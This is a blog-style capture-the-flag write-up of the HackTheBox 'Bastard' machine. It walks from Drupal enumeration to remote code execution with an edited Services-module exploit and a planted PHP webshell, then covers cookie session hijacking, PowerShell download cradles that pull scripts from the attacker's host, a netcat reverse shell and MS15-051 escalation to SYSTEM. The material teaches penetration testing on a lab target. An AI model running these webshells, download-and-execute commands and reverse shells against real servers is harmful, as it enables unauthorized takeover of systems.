---
layout: post
title:  "How to hack a website on Drupal CMS"
description: "Learn pentesting web from 0 with HackTheBox (bastard)"
date:   2019-04-20
image:  drupal.jpg
tags:   [Hacking Windows, Pentesting WEB, Hacking Drupal, Metasploit Framework]
---

In this day, we will learn how to have full control of a web server that is using drupal to host any service.  
According Wikipedia, Drupal is a free and open-source content management framework written in PHP.  
Drupal provides a back-end framework for at least 2.3% of all web sites worldwide ranging from personal blogs to corporate, political, and government sites.  
[Fuente Wikipedia](https://en.wikipedia.org/wiki/Drupal)  

In other words, in the course of learning hacking it is very likely that we will find a web server that is hosting a drupal site and we need to get access to it.  
Before starting I want to clarify that all my published content is done for educational, informative and ethical purposes.  
I am not responsible for the misuse they may give you.  

## With this tutorial you will learn:
  - How to enumerate the drupal CMS and a Windows machine
  - How to intercept requests with burpsuite.
  - How to perform a simple port scan with Nmap.
  - How to get a meterpreter session with Metasploit.
  - How to perform a directory discovery with dirb.
  - How to perform an exploit search with Searchsploit.
  - How to use Sherlock.ps1 and Powershell Empire (PowerUp.ps1)
  - How to hijack a session using a cookie with BurpSuite
  - How to hijack a session using a cookie with Google Chrome
  - How to manipulate PHP-based exploits
  - How to get a Reverse Shell with Netcat
  
To carry out this demonstration, we will perform a penetration test on a vulnerable machine called **Bastard** published on the [HackTheBox](https://www.hackthebox.eu/home/machines/profile/7) platform.  
In any process to hack or have total control over a server in an unauthorized manner must start with a system enumeration.  
For this we will perform a simple scan with Nmap, in the following way.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Bastard]─[root@Arthorias]─[0]─[2505]
╰─[:)] # nmap -T4 -Pn -sV -F -sC -oN Bastard.nmap 10.10.10.9
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-30 04:47 -05
Nmap scan report for 10.10.10.9
Host is up (0.18s latency).
Not shown: 97 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
{% endhighlight %}  

Before proceeding, we can realize that we have already identified that the system is running Drupal with version 7.  
With the previous port scan we did with Nmap, we managed to identify port 80 open.  
If we open this web page in a browser we can see this is in fact a drupal instance.  
  
<figure>
  <img src="{{site.baseurl}}/img/BastardDrupal.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/BastardDrupal.png" title="Drupal instance running on page 10.10.10.9:80">Drupal instance running on page 10.10.10.9:80</a>
  </figcaption>
</figure> 

We are going to perform a directory discovery with DIRB to see if we find something interesting:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2735]
╰─[:)] # dirb http://10.10.10.6 /usr/share/dirb/wordlists/common.txt 
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
File found: /modules — 301
File found: /misc — 301
File found: /themes — 301
File found: /search — 403
File found: /scripts — 301
File found: /user — 200
File found: /0–200
File found: /admin — 403
File found: /tag — 403
File found: /node — 200
File found: /sites — 301
File found: /template — 403
File found: /includes — 301
File found: /Search — 403
File found: /index.php — 200
Dir found: / — 200
File found: /profiles — 301
Dir found: /rest/ — 200
Dir found: /rest/0/ — 200
Dir found: /rest/user/ — 200
Dir found: /rest/comment/ — 200
Dir found: /rest/node/ — 200
{% endhighlight %}  

The Drupal version can be enumerated by browsing to 10.10.10.9/CHANGELOG.txt  

<figure>
  <img src="{{site.baseurl}}/img/BastardChangelog.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/BastardChangelog.png" title="How to know the drupal version">How to know the drupal version</a>
  </figcaption>
</figure> 

We are going to use a very useful tool to search exploits of known vulnerabilities in information systems, this we will achieve with searchsploit.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Bastard]─[root@Arthorias]─[0]─[2508]
╰─[:)] # searchsploit drupal
Drupal 7.x Module Services - Remote Code Execution  |  exploits/php/webapps/41564.php
{% endhighlight %}    

Our search yields several results, among them we managed to identify an exploit that when used successfully an attacker can execute remote code on the victim.  
I won’t go in depth on how this exploit works, but the [cliff-notes](https://www.ambionics.io/blog/drupal-services-module-rce) are that it attacks a REST endpoint created by the services extension. To exploit we just need to find out the name of the REST endpoint. Honestly, exploiting this is simply a case of reading the exploit and the attached write-up.    
We need to manually edit this exploit which is written in PHP.   
First install php-curl and we copy the exploit to our route.  

{% highlight shell %}
cp /usr/share/exploitdb/exploits/php/webapps/41564.php ./
apt-get install php-curl
{% endhighlight %}  

There are about 3 lines that need to be corrected before you can run the script.  
You will see that there is comment sign missing (#). You will have to enter the IP (host) as change the endpoint_path to “/rest” as well. If you are asking yourself what this /rest or endpoint_path does, you should read the exploit explanation in the following [link](https://www.ambionics.io/blog/drupal-services-module-rce). DIRB has found many subfolders and /Rest was one of them and is fitting into the scheme.  
The script of PHP should look like this:  

{% highlight php %}
$url = 'http://10.10.10.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'Gerh.php', /* Indicamos el nombre de nuestro archivo a crear. */
    'data' => '<?php echo(system($_GET["cmd"])); ?>' /* Indicamos que el contenido que tendra el archivo anterior; El parametro CMD nos ayudara a ejecutar comandos sobre nuestro equipo victima */
];
{% endhighlight %}  

After the execution of the exploit, we are exported the following files:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4401]
╰─[:)] # ls -la
total 292K
drwxr-xr-x 4 root root 4.0K Apr 17 03:11 .
drwxr-xr-x 8 root root 4.0K Apr 13 15:23 ..
-rwxr-xr-x 1 root root 8.8K Apr 17 02:47 41564.php
-rw-r--r-- 1 root root 1.1K Mar 30 04:48 Bastard.nmap
-rw-r--r-- 1 root root  187 Apr 17 02:48 session.json
-rw-r--r-- 1 root root  799 Apr 17 02:48 user.json
{% endhighlight %}  

The **sessions.json** file will help us to perform Session Hijacking.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4404]
╰─[:)] # cat session.json
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "xya-3zwiiR560VcO0uua4q6bP_-Otc8mTV1C27s0ebk",
    "token": "2dCM4IsWC26XnZkkofSjzmx1Dc6INTn3usnqNEb2fuI"
} 
{% endhighlight %}  

To run Remote Code Execution from our webshell we just need to add the parameter ?cmd= and the command we want to run.  
 
<figure>
  <img src="{{site.baseurl}}/img/RCEBastard.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/RCEBastard.png" title="RCE on Drupal">RCE on Drupal</a>
  </figcaption>
</figure> 

Ready friends, we can now execute commands on the server.  
With the command **"systeminfo"** we analyze which operating system is running on the machine and in which version it is.  

<figure>
  <img src="{{site.baseurl}}/img/BastardSysteminfo.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/BastardSysteminfo.png" title="Command Systeminfo on Linux">Command Systeminfo on Linux</a>
  </figcaption>
</figure> 

With the information obtained we can perform a search to find an attack vector that gives us a privilege scaling in the system.  
To validate in a faster and automated way, we will perform an analysis of local vulnerabilities to scale privileges with a script powershell.  

## Session Hijacking

Sometimes also known as cookie hijacking is the exploitation of a valid computer session—sometimes also called a session key—to gain unauthorized access to information or services in a computer system.  
[Article Complete](https://en.wikipedia.org/wiki/Session_hijacking)  

### How to steal a session from a Cookie with Burpsuite

In the following image, you can see that I do not have access to the route **http://10.10.10.9/admin**  

<figure>
  <img src="{{site.baseurl}}/img/AdminDeniedBastard.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/AdminDeniedBastard.png" title="Access Denied on the webpage /Admin">Access Denied on the webpage /Admin</a>
  </figcaption>
</figure> 

Next, we will intercept the previous request with burpsuite.  

<figure>
  <img src="{{site.baseurl}}/img/BurpDeniedBastard.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/BurpDeniedBastard.png" title="Intercepted request on Burp">Intercepted request on Burp</a>
  </figcaption>
</figure> 

We managed to identify that in sending the request, there is a cookie with the value of **hah_js=1**, what we must do is manipulate this value and assign the values that the exploit previously exported.  
The session file is in format:  
    - Session_name:abc  
    - Session_id:def  
    - Token:xyz  

The structure of the cookie must go as follows:  
**abc=def;token=xyz**  
  
<figure>
  <img src="{{site.baseurl}}/img/AdminBastard.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/AdminBastard.png" title="Successful session hijacking with Burp">Successful session hijacking with Burp</a>
  </figcaption>
</figure> 

### How to steal a session from a Cookie with Google Chrome  

Another way to perform the previously indicated process is using the Google Chrome console.
By means of Javascript it is possible to inject the cookie, this is achieved in the following way:  
Press F12, then click on console and define the cookie:  
**document.cookie = "Session_name=Session_id;token=Token"**   

<figure>
  <img src="{{site.baseurl}}/img/InspecElemAdmBastard.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/InspecElemAdmBastard.png" title="Successful session hijacking with JS">Successful session hijacking with JS</a>
  </figcaption>
</figure> 

## How to use Powershell Empire  

PowerShell Empire is a post-exploitation framework for computers and servers running Microsoft Windows, Windows Server operating systems, or both.  
[Article Complete](https://www.powershellempire.com)  

We execute the following command to clone the repository:  

{% highlight shell %}
git clone https://github.com/EmpireProject/Empire.git
{% endhighlight %}  

Now that we have PSE downloaded lets copy the PowerUp.ps1 so we can edit it.  

{% highlight shell %}
cp Empire/data/module_source/privesc/PowerUp.ps1 ./
{% endhighlight %}  

PowerUp.ps1 was made to run inside of empire so we need to add at the botom of the file **“Invoke-AllChecks”** and save.  

In order to upload the script to our victim, I will mount an HTTP server that hosts the script in powershell; later from the victim machine I will download the file making a GET request to the route where we specify.  
We go to the folder that contains our powershell script and execute the following to mount an HTTP server with Python.  

{% highlight shell %}
python3 -m http.server
{% endhighlight %}  

Then, through PowerShell, we downloaded the file into our victim computer.  

{% highlight shell %}
http://10.10.10.9/Gerh.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/PowerUp.ps1') | PowerShell -Noprofile -
{% endhighlight %}    

After making the request through the previous URL, in our attacking machine we will receive in real time the request by the GET method to the PowerUp.ps1 file.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4171]
╰─[:)] # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.9 - - [16/Apr/2019 04:02:03] "GET /PowerUp.ps1 HTTP/1.1" 200 -
{% endhighlight %}  

After a couple of min we can see the results from the powerup.ps1.

<figure>
  <img src="{{site.baseurl}}/img/ResultPowerUpBastard.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/ResultPowerUpBastard.png" title="Result of PowerUp.ps1">Result of PowerUp.ps1</a>
  </figcaption>
</figure> 

Looking at the results we can see access denied which tells us that we don’t have admin rights.

## How to use Sherlock  

[Sherlock](https://github.com/rasta-mouse/Sherlock), PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.  
Let’s try finding a vulnerability using sherlock.ps1  

Just like before we need to edit the end of the file this time with Find-AllVulns.  
We can copy and execute sherlock the same way that we did powerup.  

We downloaded our Sherlock.ps1 by accessing the following URL:  

{% highlight bash %}
http://10.10.10.9/Console.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/Sherlock.ps1') | PowerShell -Noprofile -
{% endhighlight %}  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[130]─[4182]
╰─[:)] # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.9 - - [16/Apr/2019 04:27:13] "GET /Sherlock.ps1 HTTP/1.1" 200 -
{% endhighlight %}  

The result is as follows:  

{% highlight zsh %}
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
{% endhighlight %}  

Before we do our privledge elevation we need a remote shell we can do this with netcat.  

## Reverse Shell Netcat

Initially, we downloaded the netcat executable for the 64-bit architecture.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4186]
╰─[:)] # wget https://raw.githubusercontent.com/hackingprofessional/Utilidades/master/netcat-win32-1.11.zip
{% endhighlight %}  

Unzip the netcat files so we can upload and run them.  
Setup our netcat listener.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4186]
╰─[:)] # nc -nlvp 6969
listening on [any] 6969 ...
{% endhighlight %}  

We place our nc64.exe in the folder where our HTTP server is running.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard/server]─[root@Arthorias]─[0]─[4201]
╰─[:)] # ls -la
total 624K
drwxr-xr-x 2 root root 4.0K Apr 16 04:55 .
drwxr-xr-x 3 root root 4.0K Apr 16 04:55 ..
-rw-rw-r-- 1 root root  43K Dec 26  2010 nc64.exe       <--> Our Executable of Netcat x64 
-rw-r--r-- 1 root root 550K Apr 16 03:58 PowerUp.ps1
-rw-r--r-- 1 root root  17K Apr 16 04:24 https://hackingprofessional.github.io/Security/Hacking-Windows/ Sherlock.ps1
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard/server]─[root@Arthorias]─[0]─[4202]
╰─[:)] # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}    

Next, I'm going to alter the initial code of the exploit a bit.
In this way, the next steps will be easier:  

{% highlight php %}
$url = 'http://10.10.10.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$phpCode = <<<'EOD'
<?php
    /* In the next conditional, by means of the parameter upload_file we can upload files. */
	if (isset($_REQUEST['upload_file'])) {
  		file_put_contents($_REQUEST['upload_file'], file_get_contents("http://10.10.14.17:8000/" . $_REQUEST['upload_file']));
    };
    
    /* In the next conditional, by means of the parameter execute_command we can execute commands. */ 
	if (isset($_REQUEST['execute_command'])) {
  		echo "<pre>" . shell_exec($_REQUEST['execute_command']) . "</pre>";
	};
?>
EOD;

/* We modify the data value, which must be equal to the newly created variable. */ 
$file = [
    'filename' => 'Gerh.php',
    'data' => $phpCode
];
{% endhighlight %}  

We finally downloaded our executable by accessing the following URL: 

{% highlight markdown %}  
http://10.10.10.9/Gerh.php?upload_file=nc64.exe&execute_command=nc64.exe -e cmd 10.10.14.17 6969
{% endhighlight %}  

Ok, we have already managed to have a reverse shell:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard/server]─[root@Arthorias]─[0]─[4278]
╰─[:)] # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.9 - - [17/Apr/2019 03:01:37] "GET /nc64.exe HTTP/1.0" 200 -
{% endhighlight %}  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4276]
╰─[:)] # nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.9] 49283
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54> whoami
whoami
nt authority\iusr
{% endhighlight %} 

## Privilege Escalation
Among the results thrown by the **Sherlock.ps1**, we will focus on the following:  

{% highlight markdown %}  
Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
{% endhighlight %}  

To try to exploit this vulnerability, we can download the compiled exploit from the following route:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4283]
╰─[:)] # wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS15-051/MS15-051-KB3045171.zip
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4283]
╰─[:)] # unzip MS15-051-KB3045171.zip
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4283]
╰─[:)] # mv /MS15-051-KB3045171/ms15-051x64.exe ./server
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard/server]─[root@Arthorias]─[1]─[4291]
╰─[:(] # ls -la
total 680
drwxr-xr-x 2 root root   4096 Apr 17 03:12 .
drwxr-xr-x 4 root root   4096 Apr 17 03:11 ..
-rw-r--r-- 1 root root  55296 May 13  2015 ms15-051x64.exe
-rw-rw-r-- 1 root root  43696 Dec 26  2010 nc64.exe
-rw-r--r-- 1 root root 562858 Apr 16 03:58 PowerUp.ps1
-rw-r--r-- 1 root root  16678 Apr 16 04:24 Sherlock.ps1
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard/server]─[root@Arthorias]─[0]─[4283]
╰─[:)] # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}  

After unzipping the downloaded file, we copy our executable to our folder where we have our HTTP server.
Now we just need to open a new listener with **nc** and access the following route:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4276]
╰─[:)] # nc -nlvp 6966
listening on [any] 6966 ...
{% endhighlight %}  

Link to download the exploit and perform the execution of netcat with the exploit.  

{% highlight markdown %}
http://10.10.10.9/Gerh.php?execute_command=ms15-051x64.exe "nc64.exe -e cmd 10.10.14.17 6966"
{% endhighlight %}  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard/server]─[root@Arthorias]─[0]─[4292]
╰─[:)] # nc -nlvp 6966        
listening on [any] 6966 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.9] 49287
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
{% endhighlight %}    

Ready, we have successfully escalated privileges.
To finish, I'm going to do this same demonstration but using another method, which is to do the whole process above but with the Metasploit Framework.  

**NOTE:**  
We must generate a payload with *msfvenom* and then download it from our victim machine.  

<script id="asciicast-241323" src="https://asciinema.org/a/241323.js" async></script>  

